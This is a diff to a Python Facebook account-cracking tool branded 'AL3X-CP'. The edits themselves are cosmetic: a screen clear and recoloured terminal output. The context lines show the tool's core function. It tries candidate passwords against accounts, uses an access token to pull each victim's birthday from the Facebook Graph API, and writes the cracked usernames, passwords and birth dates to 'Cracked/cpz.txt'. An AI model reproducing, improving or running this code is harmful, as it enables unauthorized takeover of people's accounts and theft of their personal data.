@@ -670,6 +670,7 @@ class crackmenu:
         for pw in zkth:
             pw = pw.lower()
             try:
+                os.system('clear')
                 os.mkdir('Cracked')
             except:
                 pass
@@ -691,7 +692,7 @@ class crackmenu:
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday'].replace('/', '-')
-                    print("\n%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, dob, N))
+                    print("\n%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m%s \x1b[1;97m\xe2\x9e\xa4 \x1b[1;90m%s \x1b[1;97m\xe2\x9e\xa4 \x1b[1;92m%s  %s" % (K, user, pw, dob, N))
                     wrt = '%s | %s | %s' % (user, pw, dob)
                     cp.append(wrt)
                     open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -700,7 +701,7 @@ class crackmenu:
                     dob = ''
                 except:
                     pass
-                print("\n%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, N))
+                print("\n%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m %s \x1b[1;97m\xe2\x9e\xa4 \x1b[1;90m%s  %s" % (K, user, pw, N))
                 wrt = '%s | %s ' % (user, pw)
                 cp.append(wrt)
                 open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
